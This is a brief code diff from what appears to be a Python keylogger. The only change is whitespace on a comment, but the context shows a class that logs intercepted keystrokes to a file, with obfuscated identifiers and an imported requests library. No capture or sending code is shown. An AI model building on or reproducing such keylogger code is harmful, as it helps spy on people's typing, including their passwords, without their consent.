@@ -16,7 +16,7 @@ import os
 import requests
 
 
-# class to log the keys and create a log file with intercepted keystrokes in
+# class to log the keys and create a log file with intercepted keystrokes in 
 class main_KL :#line:1
     def __init__ (O0O000OOO00O0OO0O ,filename :str ="keystrokes.txt")->None :#line:2
         O0O000OOO00O0OO0O .filename =filename #line:3
